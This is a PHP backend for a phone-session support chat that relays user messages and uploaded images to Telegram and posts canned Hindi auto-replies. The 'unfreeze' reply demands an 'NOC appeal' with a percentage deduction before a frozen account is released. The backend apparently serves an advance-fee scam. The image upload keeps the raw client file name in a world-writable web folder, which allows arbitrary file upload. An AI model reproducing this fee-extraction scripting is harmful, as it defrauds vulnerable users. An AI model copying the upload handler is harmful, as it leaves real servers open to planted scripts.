<?php
session_start();
require_once 'config.php';

header('Content-Type: application/json');

if (!isset($_SESSION['user_phone'])) {
    echo json_encode(['error' => 'Unauthorized']);
    exit;
}

$phone = $_SESSION['user_phone'];
$file = DATA_DIR . $phone . '.json';

if (!file_exists($file)) {
    file_put_contents($file, json_encode(['last_clear' => 0, 'messages' => []]));
}

$action = $_GET['action'] ?? '';

// FETCH CHAT
if ($action === 'fetch') {
    $data = json_decode(file_get_contents($file), true);
    echo json_encode(array_slice($data['messages'], $data['last_clear']));
    exit;
}

// SEND MESSAGE WITH UPDATED AUTO-REPLY
if ($action === 'send') {
    $msg = trim($_POST['msg'] ?? '');
    if ($msg) {
        $data = json_decode(file_get_contents($file), true);
        
        // 1. User Message Save
        $data['messages'][] = [
            'sender' => 'user', 
            'type' => 'text', 
            'text' => $msg, 
            'time' => date('H:i')
        ];

        // 2. UPDATED PROFESSIONAL AUTO-REPLY
        $botReply = "";
        $msgLower = strtolower($msg);

        if (strpos($msgLower, 'unfreeze') !== false) {
            $botReply = "सर, अकाउंट अनफ्रीज कराने के लिए NOC अपील करना आवश्यक है।\n" .
                        "NOC प्रक्रिया में निर्धारित कुछ प्रतिशत की कटौती के बाद अपील सबमिट की जाएगी।\n" .
                        "अपील सबमिट होने के 24 घंटे के भीतर आपका अकाउंट अनफ्रीज कर दिया जाएगा।\n" .
                        "धन्यवाद!";
        } elseif (strpos($msgLower, 'withdrawal') !== false) {
            $botReply = "नमस्ते सर, आपके विड्रॉल की समस्या नोट कर ली गई है। हमारी टीम आपके ट्रांजैक्शन को चेक कर रही है, कृपया कुछ समय प्रतीक्षा करें।";
        } elseif (strpos($msgLower, 'deposit') !== false) {
            $botReply = "डिपॉजिट समस्या के समाधान के लिए कृपया अपने पेमेंट का स्क्रीनशॉट यहाँ साझा करें।";
        }

        // Save Agent Auto-Reply
        if ($botReply !== "") {
            $data['messages'][] = [
                'sender' => 'agent',
                'type' => 'text', 
                'text' => $botReply, 
                'time' => date('H:i')
            ];
        }

        file_put_contents($file, json_encode($data));
        
        // Telegram Notify
        sendTelegram("<b>💬 User (+91 $phone):</b>\n$msg");
        
        echo json_encode(['status' => 'ok']);
        exit;
    }
}

// UPLOAD IMAGE
if ($action === 'upload') {
    if (isset($_FILES['image'])) {
        $upDir = 'uploads/';
        if (!file_exists($upDir)) mkdir($upDir, 0777, true);
        
        $name = time() . '_' . $_FILES['image']['name'];
        $path = $upDir . $name;
        
        if (move_uploaded_file($_FILES['image']['tmp_name'], $path)) {
            $data = json_decode(file_get_contents($file), true);
            $data['messages'][] = [
                'sender' => 'user', 
                'type' => 'image', 
                'url' => $path, 
                'time' => date('H:i')
            ];
            file_put_contents($file, json_encode($data));
            sendTelegram("<b>📸 Image from +91 $phone</b>");
            echo json_encode(['status' => 'ok']);
            exit;
        }
    }
}
?>
